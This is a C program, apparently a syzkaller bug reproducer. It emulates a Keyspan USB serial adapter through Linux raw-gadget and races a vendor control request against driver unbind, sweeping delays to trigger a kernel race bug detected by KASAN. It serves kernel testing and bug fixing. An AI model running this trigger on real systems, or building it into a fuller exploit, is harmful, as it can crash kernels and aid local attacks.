// https://syzkaller.appspot.com/bug?id=e0e1cf07c8d3d1f8d4022899db3a07584c44cf22
#define _GNU_SOURCE
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <dirent.h>
#include <time.h>

struct usb_raw_init {
	__u8	driver_name[128];
	__u8	device_name[128];
	__u8	speed;
};

struct usb_raw_event {
	__u32		type;
	__u32		length;
	__u8		data[0];
};

struct usb_raw_ep_io {
	__u16		ep;
	__u16		flags;
	__u32		length;
	__u8		data[0];
};

#define USB_RAW_IOCTL_INIT		_IOW('U', 0, struct usb_raw_init)
#define USB_RAW_IOCTL_RUN		_IO('U', 1)
#define USB_RAW_IOCTL_EVENT_FETCH	_IOR('U', 2, struct usb_raw_event)
#define USB_RAW_IOCTL_EP0_WRITE		_IOW('U', 3, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP0_READ		_IOWR('U', 4, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_CONFIGURE		_IO('U', 9)

struct usb_ctrlrequest {
	__u8 bRequestType;
	__u8 bRequest;
	__le16 wValue;
	__le16 wIndex;
	__le16 wLength;
} __attribute__ ((packed));

struct usb_device_descriptor {
	__u8  bLength;
	__u8  bDescriptorType;
	__le16 bcdUSB;
	__u8  bDeviceClass;
	__u8  bDeviceSubClass;
	__u8  bDeviceProtocol;
	__u8  bMaxPacketSize0;
	__le16 idVendor;
	__le16 idProduct;
	__le16 bcdDevice;
	__u8  iManufacturer;
	__u8  iProduct;
	__u8  iSerialNumber;
	__u8  bNumConfigurations;
} __attribute__ ((packed));

struct usb_config_descriptor {
	__u8  bLength;
	__u8  bDescriptorType;
	__le16 wTotalLength;
	__u8  bNumInterfaces;
	__u8  bConfigurationValue;
	__u8  iConfiguration;
	__u8  bmAttributes;
	__u8  bMaxPower;
} __attribute__ ((packed));

struct usb_interface_descriptor {
	__u8  bLength;
	__u8  bDescriptorType;
	__u8  bInterfaceNumber;
	__u8  bAlternateSetting;
	__u8  bNumEndpoints;
	__u8  bInterfaceClass;
	__u8  bInterfaceSubClass;
	__u8  bInterfaceProtocol;
	__u8  iInterface;
} __attribute__ ((packed));

struct config_desc {
	struct usb_config_descriptor conf;
	struct usb_interface_descriptor intf;
} __attribute__((packed));

static struct usb_device_descriptor dev_desc;
static struct config_desc conf_desc;
static int raw_fd;
static volatile int request_received = 0;
static volatile int unbind_started = 0;
static volatile int terminate = 0;
static volatile uint32_t delay_us = 0;

static uint64_t get_time_ns(void) {
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return (uint64_t)ts.tv_sec * 1000000000ULL + ts.tv_nsec;
}

static void busy_wait_us(uint32_t us) {
	uint64_t start = get_time_ns();
	while (get_time_ns() - start < us * 1000ULL) {
		// busy wait
	}
}

static void init_descriptors(void)
{
	dev_desc.bLength = 18;
	dev_desc.bDescriptorType = 1;
	dev_desc.bcdUSB = htole16(0x0200);
	dev_desc.bDeviceClass = 0xff;
	dev_desc.bDeviceSubClass = 0;
	dev_desc.bDeviceProtocol = 0;
	dev_desc.bMaxPacketSize0 = 64;
	dev_desc.idVendor = htole16(0x06cd); // Keyspan
	dev_desc.idProduct = htole16(0x0131); // USA-49WG
	dev_desc.bcdDevice = htole16(0x0100);
	dev_desc.iManufacturer = 0;
	dev_desc.iProduct = 0;
	dev_desc.iSerialNumber = 0;
	dev_desc.bNumConfigurations = 1;

	conf_desc.conf.bLength = 9;
	conf_desc.conf.bDescriptorType = 2;
	conf_desc.conf.wTotalLength = htole16(sizeof(struct config_desc));
	conf_desc.conf.bNumInterfaces = 1;
	conf_desc.conf.bConfigurationValue = 1;
	conf_desc.conf.iConfiguration = 0;
	conf_desc.conf.bmAttributes = 0x80;
	conf_desc.conf.bMaxPower = 50;

	conf_desc.intf.bLength = 9;
	conf_desc.intf.bDescriptorType = 4;
	conf_desc.intf.bInterfaceNumber = 0;
	conf_desc.intf.bAlternateSetting = 0;
	conf_desc.intf.bNumEndpoints = 0;
	conf_desc.intf.bInterfaceClass = 0xff;
	conf_desc.intf.bInterfaceSubClass = 0xff;
	conf_desc.intf.bInterfaceProtocol = 0xff;
	conf_desc.intf.iInterface = 0;
}

static void *device_thread(void *arg)
{
	struct usb_raw_event *event = malloc(sizeof(*event) + 4096);
	if (!event) return NULL;

	while (!__atomic_load_n(&terminate, __ATOMIC_ACQUIRE)) {
		event->type = 0;
		event->length = 4096;
		if (ioctl(raw_fd, USB_RAW_IOCTL_EVENT_FETCH, event) < 0) {
			if (errno == EINTR) continue;
			break;
		}

		if (event->type == 1) { // USB_RAW_EVENT_CONNECT
			// Do nothing
		} else if (event->type == 2) { // USB_RAW_EVENT_CONTROL
			struct usb_ctrlrequest *ctrl = (struct usb_ctrlrequest *)event->data;
			
			struct usb_raw_ep_io *io = malloc(sizeof(*io) + 4096);
			io->ep = 0;
			io->flags = 0;
			io->length = 0;

			if (ctrl->bRequestType == 0x80 && ctrl->bRequest == 6) { // GET_DESCRIPTOR
				if ((le16toh(ctrl->wValue) >> 8) == 1) { // DEVICE
					io->length = sizeof(dev_desc);
					if (io->length > le16toh(ctrl->wLength))
						io->length = le16toh(ctrl->wLength);
					memcpy(io->data, &dev_desc, io->length);
				} else if ((le16toh(ctrl->wValue) >> 8) == 2) { // CONFIG
					io->length = sizeof(conf_desc);
					if (io->length > le16toh(ctrl->wLength))
						io->length = le16toh(ctrl->wLength);
					memcpy(io->data, &conf_desc, io->length);
				}
			} else if (ctrl->bRequestType == 0 && ctrl->bRequest == 9) { // SET_CONFIGURATION
				ioctl(raw_fd, USB_RAW_IOCTL_CONFIGURE, 0);
			} else if (ctrl->bRequestType == 0x40 && ctrl->bRequest == 0xB0) {
				// This is the glocont_urb!
				__atomic_store_n(&request_received, 1, __ATOMIC_RELEASE);
				
				// Wait for main thread to start unbind
				while (!__atomic_load_n(&unbind_started, __ATOMIC_ACQUIRE)) {
					if (__atomic_load_n(&terminate, __ATOMIC_ACQUIRE)) break;
				}
				
				// Wait for unbind to reach the race window
				busy_wait_us(delay_us);
				
				// Complete the URB with EP0_READ (since it's DIR_OUT)
				io->length = 0;
				if (ioctl(raw_fd, USB_RAW_IOCTL_EP0_READ, io) < 0) {
					// Ignore errors
				}
				free(io);
				continue;
			}

			if (ctrl->bRequestType & 0x80) { // DIR_IN
				if (ioctl(raw_fd, USB_RAW_IOCTL_EP0_WRITE, io) < 0) {}
			} else { // DIR_OUT
				io->length = le16toh(ctrl->wLength);
				if (ioctl(raw_fd, USB_RAW_IOCTL_EP0_READ, io) < 0) {}
			}
			free(io);
		}
	}
	free(event);
	return NULL;
}

static int find_tty_path(char *out_path, size_t max_len) {
	DIR *dir = opendir("/sys/class/tty");
	if (!dir) return 0;
	struct dirent *entry;
	int found = 0;
	while ((entry = readdir(dir)) != NULL) {
		if (strncmp(entry->d_name, "ttyUSB", 6) == 0) {
			char sys_path[512];
			char link_buf[512];
			snprintf(sys_path, sizeof(sys_path), "/sys/class/tty/%s/device/../driver", entry->d_name);
			ssize_t len = readlink(sys_path, link_buf, sizeof(link_buf) - 1);
			if (len > 0) {
				link_buf[len] = '\0';
				if (strstr(link_buf, "keyspan")) {
					snprintf(out_path, max_len, "/dev/%s", entry->d_name);
					found = 1;
					break;
				}
			}
		}
	}
	closedir(dir);
	return found;
}

int get_keyspan_unbind_fd(char *dev_name) {
	DIR *d = opendir("/sys/bus/usb/drivers/keyspan");
	if (!d) return -1;
	struct dirent *dir;
	while ((dir = readdir(d)) != NULL) {
		if (strchr(dir->d_name, ':')) {
			strcpy(dev_name, dir->d_name);
			int fd = open("/sys/bus/usb/drivers/keyspan/unbind", O_WRONLY);
			closedir(d);
			return fd;
		}
	}
	closedir(d);
	return -1;
}

int main(void)
{
	init_descriptors();

	raw_fd = open("/dev/raw-gadget", O_RDWR);
	if (raw_fd < 0) {
		printf("[-] Failed to open /dev/raw-gadget: %s\n", strerror(errno));
		return 1;
	}

	struct usb_raw_init init = {
		.driver_name = "dummy_udc",
		.device_name = "dummy_udc.0",
		.speed = 2, // USB_SPEED_HIGH
	};

	if (ioctl(raw_fd, USB_RAW_IOCTL_INIT, &init) < 0) {
		printf("[-] Failed to init raw-gadget: %s\n", strerror(errno));
		return 1;
	}

	if (ioctl(raw_fd, USB_RAW_IOCTL_RUN, 0) < 0) {
		printf("[-] Failed to run raw-gadget: %s\n", strerror(errno));
		return 1;
	}

	pthread_t tid;
	pthread_create(&tid, NULL, device_thread, NULL);

	char tty_path[256];
	int found = 0;
	for (int wait = 0; wait < 50; wait++) {
		if (find_tty_path(tty_path, sizeof(tty_path))) {
			found = 1;
			break;
		}
		usleep(100000);
	}

	if (!found) {
		printf("[-] Failed to find ttyUSB\n");
		__atomic_store_n(&terminate, 1, __ATOMIC_RELEASE);
		close(raw_fd);
		pthread_join(tid, NULL);
		return 1;
	}

	char usb_dev_name[256];
	int unbind_fd = get_keyspan_unbind_fd(usb_dev_name);
	if (unbind_fd < 0) {
		printf("[-] Failed to open unbind\n");
		__atomic_store_n(&terminate, 1, __ATOMIC_RELEASE);
		close(raw_fd);
		pthread_join(tid, NULL);
		return 1;
	}

	int bind_fd = open("/sys/bus/usb/drivers/keyspan/bind", O_WRONLY);
	if (bind_fd < 0) {
		printf("[-] Failed to open bind\n");
		__atomic_store_n(&terminate, 1, __ATOMIC_RELEASE);
		close(raw_fd);
		pthread_join(tid, NULL);
		return 1;
	}

	printf("[+] Gadget initialized and bound to %s\n", usb_dev_name);

	// Sweep the delay to hit the race window
	for (delay_us = 0; delay_us < 10000; delay_us += 10) {
		if (delay_us % 1000 == 0) {
			printf("[*] Trying with delay_us = %d\n", delay_us);
		}

		__atomic_store_n(&request_received, 0, __ATOMIC_RELEASE);
		__atomic_store_n(&unbind_started, 0, __ATOMIC_RELEASE);

		int tty_fd = open(tty_path, O_RDWR | O_NOCTTY | O_NONBLOCK);
		if (tty_fd < 0) {
			// Try to find new tty path if open fails
			if (find_tty_path(tty_path, sizeof(tty_path))) {
				tty_fd = open(tty_path, O_RDWR | O_NOCTTY | O_NONBLOCK);
			}
			if (tty_fd < 0) continue;
		}

		// Wait for device thread to receive the glocont_urb
		uint64_t start = get_time_ns();
		while (!__atomic_load_n(&request_received, __ATOMIC_ACQUIRE) && (get_time_ns() - start < 100000000ULL)) {
			// busy wait up to 100ms
		}

		if (__atomic_load_n(&request_received, __ATOMIC_ACQUIRE)) {
			// Signal device thread to start delay
			__atomic_store_n(&unbind_started, 1, __ATOMIC_RELEASE);
			
			// Trigger disconnect via sysfs. This synchronously calls keyspan_port_remove.
			if (write(unbind_fd, usb_dev_name, strlen(usb_dev_name)) < 0) {
				// Ignore errors
			}
		}

		close(tty_fd);

		// Re-bind for next iteration
		if (write(bind_fd, usb_dev_name, strlen(usb_dev_name)) < 0) {
			// Ignore
		}
		
		// Wait for bind to complete and find new tty path
		found = 0;
		for (int wait = 0; wait < 20; wait++) {
			if (find_tty_path(tty_path, sizeof(tty_path))) {
				found = 1;
				break;
			}
			usleep(5000);
		}
		if (!found) {
			printf("[-] Failed to find ttyUSB after re-bind\n");
			break;
		}
	}

	printf("[+] Finished sweep\n");

	__atomic_store_n(&terminate, 1, __ATOMIC_RELEASE);
	close(raw_fd);
	pthread_join(tid, NULL);
	
	usleep(500000); // Wait a bit for KASAN to report

	return 0;
}
